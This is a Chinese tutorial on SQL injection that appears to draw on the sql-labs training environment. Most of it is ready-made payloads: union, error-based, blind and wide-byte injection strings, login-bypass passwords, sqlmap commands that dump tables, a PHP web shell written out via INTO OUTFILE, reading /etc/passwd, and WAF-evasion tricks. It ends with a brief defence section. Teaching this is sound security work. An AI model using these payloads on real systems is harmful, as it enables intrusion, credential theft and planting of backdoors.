# 基础知识

## 数据库

数据库，简而言之可视为电子化的文件柜——存储电子文件的处所，用户可以对文件中的数据进行新增、截取、更新、删除等操作。

所谓“数据库”是以一定方式储存在一起、能与多个用户共享、具有尽可能小的冗余度、与应用程序彼此独立的数据集合。

## SQL

结构化查询语言(Structured Query Language)简称SQL，是一种特殊目的的编程语言，是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系数据库系统；同时也是数据库脚本文件的扩展名。

      1986年10月，美国国家标准协会对SQL进行规范后，以此作为关系式数据库管理系统的标准语言（ANSI X3. 135-1986），1987年得到国际标准组织的支持下成为国际标准。不过各种通行的数据库系统在其实践过程中都对SQL规范作了某些编改和扩充。所以，实际上不同数据库系统之间的SQL不能完全相互通用。

### **常见****SQL****语句**

```sql
1、select（查）：select * from 表名；
2、insert into（增）：insert into 表名 values （value1，value2，value3，······）；
3、delete（删）：delete from 表名 where 字段名=value；
                drop database 库名；
4、update（改）：update 表名 set 字段名1=value1，字段名2=value2 where 字段名3=value3；
```
# SQL注入漏洞

## 漏洞原理

	SQL注入攻击是通过将恶意的SQL语句插入到应用的输入参数中，再在后台SQL服务器上解析执行进行的攻击，它目前是黑客对数据库进行攻击的最常用的手段之一。是由于开发者在编写操作数据库代码时，直接将外部可控的参数拼接到SQL语句中，没有经过任何过滤或过滤不严谨导致的。

	例：

```sql
url格式：www.xxx.com/xxx.php?id=x
后台SQL查询语句格式：SELECT * FROM users WHERE id='$_GET[id]' LIMIT 0,1
id=1  ==> select * from 表名 where id=1;(注入前)
id=1 or 1=1 ==> select * from 表名 where id=1 or 1=1;（注入后）
?id=1\' order by x# ==> SELECT * FROM users WHERE id='1' order by x#'LIMIT 0,1
```
## **漏洞危害**

1、非法读取、篡改、添加、删除数据库中的数据；

2、盗取用户的各类敏感信息，获取利益；

3、通过修改数据库来修改网页上的内容；

4、私自添加或删除账号；

5、注入木马；

6、权限足够的情况下甚至可以操作系统文件，执行系统命令等等。

# SQL注入类型

## **根据注入方式分类**

1、union注入 联合查询 

2、报错注入 

3、盲注 

              盲注又可以分为：布尔盲注和时间盲注。

4、宽字节注入

5、二次注入

## **根据注入点位置分类**

1、GET型注入

2、POST型注入

3、http头注入：Cookie注入、Host头注入、X-Forwarded-For注入

## **根据注入后****sql****语句的完整度分类**

内联式注入

<img src="SQL注入/media/1634051626609854000777.png" alt="SQL注入/media/1634051626609854000777.png" style="zoom:50%;" align="left"/>
↓

<img src="SQL注入/media/1634051626613869000490.png" alt="SQL注入/media/1634051626613869000490.png" style="zoom:50%;" align="left"/>
↓

<img src="SQL注入/media/1634051626616334000730.png" alt="SQL注入/media/1634051626616334000730.png" style="zoom:50%;" align="left"/>
终止式注入

<img src="SQL注入/media/1634051626617746000643.png" alt="SQL注入/media/1634051626617746000643.png" style="zoom:50%;" align="left"/>
↓

<img src="SQL注入/media/1634051626618598000540.png" alt="SQL注入/media/1634051626618598000540.png" style="zoom:50%;" align="left"/>
↓

<img src="SQL注入/media/1634051626627957000807.png" alt="SQL注入/media/1634051626627957000807.png" style="zoom:50%;" align="left"/>
# SQL注入万能密码

正常情况下的登录验证语句

<img src="SQL注入/media/1634051626632377000146.png" alt="SQL注入/media/1634051626632377000146.png" style="zoom:50%;" align="left"/>
根据sql注入原理使用万能密码

```sql
$user = admin' or 1=1#
```
<img src="SQL注入/media/1634051626639431000283.png" alt="SQL注入/media/1634051626639431000283.png" style="zoom:50%;" align="left"/>
脚本语言无法理解SQL语句，两者对查询语句处理不一致导致SQL注入，篡改了SQL语句原本逻辑，如上图。

## 常用万能密码

|"or"a"="a|"or 1=1--|# -- --+|admin'--|
|:----|:----|:----|:----|
|')or('a'='a|'or"='|%23|admin' or 4=4--|
|")or("a"="a|'or 1=1%00|admin' or 1=1/*|admin' or '1'='1'--|
|'or 1=1--|'or 1=1/*|'or'='or'|admin' or 2=2#|

# SQL手工注入流程

## **寻找注入点**

判断某个链接是否存在SQL注入，可以通过对其传入的可控参数进行简单的构造，通过服务端返回的内容来判断有无注入。首先尝试在url中添加“'”观察是否会报错；随后通过添加 and 1=1或者and1=2进一步确认，如果“'”触发报错，则说明大概率为注入点，and 1=1返回原页面，and1=2返回空白或者报错，则基本证明此处为注入点。

1. **闭合引号或括号判断**

  [www.xxx.com/](http://www.xxx.com/)xxx.php?id=1'

  [www.xxx.com/](http://www.xxx.com/)xxx.php?id=1"

  [www.xxx.com/](http://www.xxx.com/)xxx.php?id=1')

  [www.xxx.com/](http://www.xxx.com/)xxx.php?id=1")

  如果出现错误提示，则该网站可能就存在注入漏洞

2. **通过构造“恒真”和“恒假”来判断**

  [www.xxx.com/xxx.php?id=1](http://www.xxx.com/xxx.php?id=1)' and 1=1  恒真，页面显示正常

  [www.xxx.com/](http://www.xxx.com/)xxx.php?id=1' and 1=2  恒假，如果报错或者页面内容消失可以初步判断为存在注入

  [www.xxx.com/xxx.php?id=1](http://www.xxx.com/xxx.php?id=1)  页面响应时间正常

  [www.xxx.com/xxx.php?id=1](http://www.xxx.com/xxx.php?id=1)' and sleep(5)  如果页面响应时间有延迟可以判断为存在注入

3. **通过加减乘除判断注入点**

[www.xxx.com/xxx.php?id=2](http://www.xxx.com/xxx.php?id=2)   页面显示正常

如果以下3个请求显示的页面跟 id=2 一样，则可以判断为存在注入

[www.xxx.com/xxx.php?id=4-2](http://www.xxx.com/xxx.php?id=4-2)  

[www.xxx.com/xxx.php?id=1+1](http://www.xxx.com/xxx.php?id=1+1)

[www.xxx.com/xxx.php?id=6/3](http://www.xxx.com/xxx.php?id=6/3)

## **确定字段个数**

通过在参数后面插入“order by x#”来确定字段个数，直到“order by x#”正常显示并且“order by x+1#”报错为止，报错是说明x+1超过了字段个数，字段个数就是x

例如：

   [www.xxx.com/xxx.php?id=2](http://www.xxx.com/xxx.php?id=2)’ order by 3#  正常显示

  并且

   [www.xxx.com/xxx.php?id=2](http://www.xxx.com/xxx.php?id=2)’ order by 4#  报错

说明字段个数为3

## **确定字段回显位置**

在参数后面添加“union select 1,2,3,…,x-1,x#”(x是字段个数），联合查询确定可回显位置

PS：联合查询时记得把前面的查询为空

例如：

   [www.xxx.com/xxx.php?id=-2](http://www.xxx.com/xxx.php?id=-2)'%20union%20select%201,2,3#

下图说明第2、3字段可回显

<img src="SQL注入/media/1634051626650780000301.png" alt="SQL注入/media/1634051626650780000301.png" style="zoom:50%;" align="left"/>
## **判断数据库信息**

在回显位置插入数据库内置函数

数据库版本：version() 、数据库名：database() 、数据库用户名：user() 

操作系统信息：select @@global.version_compile_os from mysql.user

例如：

   [www.xxx.com/xxx.php?](http://www.xxx.com/xxx.php?) id=-2’%20union%20select%201,2,user()#

<img src="SQL注入/media/1634051626652538000944.png" alt="SQL注入/media/1634051626652538000944.png" style="zoom:50%;" align="left"/>
## **查询数据**

mysql>5.0版本中，information_schema这这个数据库中保存了MySQL服务器所有数据库的信息。如数据库名，数据表，表里的数据类型与访问权限等（这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面）。

```sql
information_schema的表schemata中的列schema_name记录了所有数据库的名字
information_schema的表tables中的列table_schema记录了所有数据库的名字
information_schema的表tables中的列table_name记录了所有数据库的表的名字
information_schema的表columns中的列table_schema记录了所有数据库的名字
information_schema的表columns中的列table_name记录了所有数据库的表的名字
information_schema的表columns中的列column_name记录了所有数据库的表的列的名字

查名：select group_concat(table_name) from information_schema.tables where table_schema=database()
查段名：select group_concat(column_name) from information_schema.columns where table_name=‘表名’
查询数据：select 字段1,字段2 from 表名
例如：
id=-2'%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20
table_schema=database()#
```
<img src="SQL注入/media/1634051626657809000369.png" alt="SQL注入/media/1634051626657809000369.png" style="zoom:50%;" align="left"/>

# SQL注入-联合查询

## 联合查询概念

union联合查询算是最简单的一种注入了，也是最常见的。

UNION操作符用于合并两个或多个SELECT语句的结果集，而且UNION内部的SELECT语句必须拥有相同数量的列，列也必须拥有相似的数据类型，同时，每条SELCCT语句中的列的顺序必须相同。

## **union****注入特点**

1. 有回显，可以看到某些字段的回显结果（通常）
2. 猜解出字段数目
3. 最方便的注入方式
4. Union语句可以填充查询结果，并且额外执行一次查询
5. 只有最后一个SELECT子句允许有ORDER BY或LIMIT

<img src="SQL注入/media/1634051626663278000724.png" alt="SQL注入/media/1634051626663278000724.png" style="zoom:50%;" align="left"/>
那么为了确定回显位置，我们需要第一条查询结果为空，才能将我们填充的数字显示在页面上，所以我们使where限制的条件为空即可。
<img src="SQL注入/media/1634051626667120000838.png" alt="SQL注入/media/1634051626667120000838.png" style="zoom:50%;" align="left"/>
已知comment_id=-5的记录是不存在的，所以我们填写的数字将填充显示位。

## 常用内置函数

version()——MySQL 版本

user()——数据库用户名

database()——数据库名

@@datadir——数据库路径

@@version_compile_os——操作系统版本

## 通过limit进行逐个注入

```sql
逐个爆出库名：?id=-1' union select 1,schema_name,user() from information_schema.schemata limit 0,1 #
逐个爆出表名：?id=-1' union select 1,table_name,user() from information_schema.tables where table_schema='库名' limit 0,1#
逐个爆出字段名：?id=-1' union select 1,column_name,user() from information_schema.columns where table_name='表名' limit 0,1#
爆出需要的字段值：?id=-1' union select 1,username,password from users limit 0,1#
```
## 通过group_concat（）实现更高效的注入

```sql
一次爆出所有数据库名：?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata #
一次爆出所以表名：?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='库名’#
一次爆出所有字段名：?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='表名’#
一次爆出所有字段值：?id=-1' union select 1,group_concat(username,0x7c,password),3 from users#
```
# SQL注入-报错注入

## **报错注入特点**

当存在注入但无正常回显时，可以使用报错注入，报错注入速度较快，两个重要函数：

concat（)、updatexml（），报错报的是xpath错误。XPath即为XML路径语言（XML Path Language），它是一种用来确定XML文档中某部分位置的语言。 

concat（）的作用是连接字符串，并促使updatexml（）报错，至少需要两个参数。updatexml（）的作用是报错，其中有三个参数。第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。

## **报错注入一般流程**

**查询用户：**

拼接注入语句 concat(0x7c,select user(),0x7c)

updatexml(1,concat(0x7c,select user(),0x7c),1)

完整的注入语句:?id=1 and updatexml(1,concat(0x7c,(select user()),0x7c),1)

**查询库名：**

```sql
?id=1' and updatexml(1,concat(0x7c,(select database()),0x7c),1) %23
```
**查询表名：**
```sql
?id=1' and updatexml(1,concat(0x7c,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7c),1) %23
```
**查询字段名：**
```sql
?id=1' and updatexml(1,concat(0x7c,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7c),1)%23
```
sql-labs第五关对应报错注入，注入语句如下：
```sql
?id=1' and updatexml(1,concat(0x7c,(select username from users limit 0,1),0x7c),1)%23
```
注入效果如下：
<img src="SQL注入/media/1634051626679108000220.png" alt="SQL注入/media/1634051626679108000220.png" style="zoom:50%;" align="left"/>
## **其他报错注入**

1. floor() 语句:and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);

floor函数和group by一起用时会发生冲突，导致报错。

2. ExtractValue() 和upadtexml()用法差不多 语句:and extractvalue(1, concat(0x5c, (select user())));
# SQL注入-盲注

## **布尔盲注**

### **特点**

1. 在没有数据回显的情况下，可以存在不同的页面内容回显
2. 通常逐个爆破猜解，效率偏低
3. 思路：利用回显的不同推测SQL语句执行的结果是True还是False
4. payload：select * from users where user='xx' and pass>'123'#'
### 常用函数

ascii（）括号中的参数转化成相应的ascii码

substr（）substr(a,b,c)从b 位置开始，截取字符串a 的c 长度。

mid（）用法与substr（）类似

length（）返回str字符串的长度

left（database(),1） 取database字符串的左边第一个

### 实操

**爆出数据库版本：**

```sql
and mid(version(),1,1)=53
```
**爆出数据库用户：**
```sql
and ascii(mid(user(),1,1))>96
```
**爆出表名：**
```sql
and ascii(mid((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))>96
```
## **时间盲注**

### 特点

1. 页面不存在不同回显，但SQL语句被执行
2. 逐个爆破猜解+时间延迟，效率最低
3. 利用：if (query=True) delay(1000);else pass;的程序逻辑，通过观察是否发生了时间延迟来推测SQL语句的执行情况是否为True
```sql
payload：If(ascii(substr(database(),1,1))>115,sleep(5),0)%23 //if 判断语句， 条件为假，执行 sleep
```
### 常用函数

if(a,b,c) a为条件，a为true，返回b，否则返回c，如if(1>2,1,0),返回0

sleep（）执行挂起一段时间

利用方式：

```sql
and if(mid(version(),1,1)=1,sleep(10),1)
```
也可以和布尔盲注联合起来使用
# SQL注入-宽字节注入

## 字符、字符集与字符序

1. 字符（character）是组成字符集（character set）的基本单位。
2. 对字符赋予一个数值（encoding）来确定这个字符在该字符集中的位置。
3. 字符序（collation）指同一字符集内字符间的比较规则。
## UTF-8

由于ASCII表示的字符只有128个，因此通常使用UNICODE编码，但用ASCII表示的字符使用UNICODE并不高效，所以出现了中间格式字符集，被称为通用转换格式，及UTF（Universal Transformation Format）。

## 宽字节

GB2312、GBK、GB18030、BIG5、Shift_JIS 等这些都是常说的宽字节，这些编码中一个字符实际上占两字节。宽字节带来的安全问题主要是吃ASCII字符（一字节）的现象。

## MYSQL的字符集转换过程

MySQL收到请求时，将请求数据从 character_set_client 转换为 character_set_connection；

进行内部操作前将请求数据从character_set_connection转换为内部操作字符集。宽字节注入发生的位置就是PHP发送请求到 MYSQL 时字符集使用 character_set_client 设置值进行了一次编码。

## 宽字节注入原理

ASCII占一字节，GBK 占两字节，MYSQL默认字符集是GBK等宽字节字符集。%df' 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\'，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果字符集是默认状态，MYSQL会认为 %df%5c 是一个宽字符，也就是“縗”，也就是说：%df\' → %df%5c%27 → 縗'，被转义的单引号恢复正常了。利用宽字节是为了绕过转义，绕过之后的步骤跟其他注入方式一样。

例如：

```sql
?id=1%df%27%20order%20by%203--+
```
## 宽字节注入场景

1. 使用不安全的编码
2. 对特殊符号进行转义（在mysql中，用于转义的函数有 addslashes，mysql_real_escape_string ， mysql_escape_string等）

<img src="SQL注入/media/1634051626696619000704.png" alt="SQL注入/media/1634051626696619000704.png" style="zoom:50%;" align="left"/>
单引号被转义

<img src="SQL注入/media/1634051626699272000383.png" alt="SQL注入/media/1634051626699272000383.png" style="zoom:50%;" align="left"/>
利用宽字节缺陷绕过转义

<img src="SQL注入/media/1634051626700627000919.png" alt="SQL注入/media/1634051626700627000919.png" style="zoom:50%;" align="left"/>
sql-labs第32关对应宽字节注入，payload如下：

```sql
?id=-1%df%27%20union%20select%201,2,group_concat(schema_name)%20from%20information_schema.schemata%20--+
?id=1.1%df%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%20--+
?id=1.1%df%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x75736572%20--+
```
# SQL注入-二次注入

## **二次注入原理**

二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。

防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。

<img src="SQL注入/media/1634051626704903000399.png" alt="SQL注入/media/1634051626704903000399.png" style="zoom:50%;" align="left"/>
## 二次注入步骤

**第一步：插入恶意数据**

 进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。

**第二步：引用恶意数据**

 开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。

## 实操

二次注入可以通过注册和登录功能来实现，先注册恶意账号”admin'#”，密码是123，如下：

<img src="SQL注入/media/1634051626709094000704.png" alt="SQL注入/media/1634051626709094000704.png" style="zoom:50%;" align="left"/>
<img src="SQL注入/media/1634051626710353000312.png" alt="SQL注入/media/1634051626710353000312.png" style="zoom:50%;" align="left"/>
登录恶意账号并修改密码为123456，如下：

<img src="SQL注入/media/1634051626713089000329.png" alt="SQL注入/media/1634051626713089000329.png" style="zoom:50%;" align="left"/>
此时从数据库中查找的用户名是“admin'#”，从数据库读取时并不会进行转义，所以最后修改的是admin的密码

<img src="SQL注入/media/1634051626714858000334.png" alt="SQL注入/media/1634051626714858000334.png" style="zoom:50%;" align="left"/>





# Sqlmap使用技巧

## Sqlmap介绍

sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB。采用五种独特的SQL注入技术，分别是：1）基于布尔的盲注，即可以根据返回页面判断条件真假的注入。2）基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来断。3）基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。4）联合查询注入，可以使用union的情况下的注入。5）堆查询注入，可以同时执行多条语句的执行时的注入。

## 检测注入点

* 基本格式

  sqlmap -u "http://www.xxx.com/xxx.php?id=1"  （默认使用level1，检测全部数据库类型）

  sqlmap -u "http://www.xxx.com/xxx.php?id=1"  --dbms mysql --level 3  (指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）)

* cookie注入

  sqlmap -u "http://www.xxx.com/xxx.php" --cookie "id=xxxx" --level 2

* 从post数据包中注入

  sqlmap -r "D:\test\post.txt" -p id --dbms mysql    -p指定参数

## **指定不同格式的目标**

-d DIRECT 直接连接到数据库。

-u URL, --url=URL 目标URL。

-l LIST 从Burp或WebScarab代理的日志中解析目标。

-r REQUESTFILE 从一个文件中载入HTTP请求。

-g GOOGLEDORK 处理Google dork的结果作为目标URL。

-c CONFIGFILE 从INI配置文件中加载选项。

## 查数据

* 查看数据库

  sqlmap -u "http://www.xxx.com/xxx.php?id=1" --dbs

* 查看表

   sqlmap -u "http://www.xxx.com/xxx.php?id=1" -D db --tables  （-D指定数据库）

* 查看字段

   sqlmap -u "http://www.xxx.com/xxx.php?id=1" -D db -T table --columns  （ -T指定表）

* 读取数据

   sqlmap -u "http://www.xxx.com/xxx.php?id=1" -D db -T table -C c1,c2 --dump  (-C指定字段）


## 其他参数

--is-dba  当前用户权限（是否为root权限）

--dbs  所有数据库

--current-db  网站当前数据库

--users  所有数据库用户

--current-user  当前数据库用户

--random-agent  构造随机user-agent

--proxy http://127.0.0.1:8080   代理

--time-sec=TIMESEC   DBMS响应的延迟时间（默认为5秒）

## tamper

使用SQLMap提供的tamper脚本，可在一定程度上避开应用程序的敏感字符过滤、绕过WAF规则的阻挡，继而进行渗透攻击。

用法：sqlmap -u "http://www.xxx.com/xxx.php?id=1" --dbs --tamper=t1,t2,t3

**以下为常用tamper脚本列表：**

<img src="SQL注入/media/1634051626730525000858.png" alt="SQL注入/media/1634051626730525000858.png" style="zoom:50%;" align="left"/>
# SQL注入高级用法

## 提权

* 在权限足够的情况下，通过SQL注入进行文件的读写：

load_file() 读文件：union select 1，load_file('/etc/passwd')

into outfile() 写文件：select * into outfile('/var/www/html/1.txt')

into dumpfile()写文件：select * into dumpfile('/var/www/html/1.txt')

* dumpfile和outfile的区别：

dumpfile输出的内容没有格式，而且内容全部在一行，适合写入可执行文件。

outfile适合写入一句话木马，语句如下：

```sql
?id=1' union select 1,2,"<?php @eval($_POST['pass']); ?>" into outfile "D:/test/WWW/shell.php"%23
```
* secure-file-priv 的限制

<img src="SQL注入/media/1634051626736010000842.png" alt="SQL注入/media/1634051626736010000842.png" style="zoom:50%;" align="left"/>
## WAF绕过

1. 应对简单的非迭代的将select、or等关键字替换为空字符串的防御
```sql
seselectlect from 、where username='x' OorR 1=1
```
2. 应对简单的区分大小写的关键字匹配，比如php中preg_match函数没有加/i参数
```sql
SelecT，Or
```
3. 编码绕过
        * ASCII

admin可以用CHAR(97)+char(100)+char(109)+char(105)+char(110)代替,select * from admin where username=(CHAR(97)+char(100)+char(109)+char(105)+char(11 0))

        * 16进制

extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)

        * unicode编码

  单引号——%u0027 、%u02b9、%u02bc、%u02c8、%u2032、%uff07

        * URL编码

or 1=1——%6f%72%20%31%3d%31

4. 特殊字符绕过
        * 空格被限制：/**/、%a0、%0a、%0d、%09、tab....
        * 内联注释：select 1 from /*!admin*/ /*!union*/ select 2,
        * MYSQL对%00不会截断：se%00lect
        * 单一%号，在asp+iis中会被忽略：sel%ect
        * ``mysql反引号之间的会被当做注释内容
5. 其他绕过方式
        * Or   →  ||、and  → &&
        * 空格被限制：select(username)from(admin)
        * 科学计数法绕过：where username=1e1union select
        * =、<、>被限制：where id in (1,2)、where id between 1 and 3、like
        * access中使用dlookup绕过select from被限制：(user=12',info=dlookup('[user]','userinfo','[id]=1')%00)
# SQL注入防御

1. **（简单又有效的方法）PreparedStatement**

采用预编译语句集，它内置了处理SQL注入的能力，只要使用它的setXXX方法传值即可。

好处：

* 代码的可读性和可维护性。
* PreparedStatement尽最大可能提高性能。
* 最重要的一点是极大地提高了安全性。

原理：

sql注入只对sql语句的准备(编译)过程有破坏作用，而PreparedStatement已经准备好了,执行阶段只是把输入串作为数据处理,而不再对sql语句进行解析,准备,因此也就避免了sql注入问题。

2. **关键字及特殊字符过滤**

对用户输入进行关键字匹配及过滤。

3. **使用参数化查询**

避免将参数与SQL语句直接拼接。


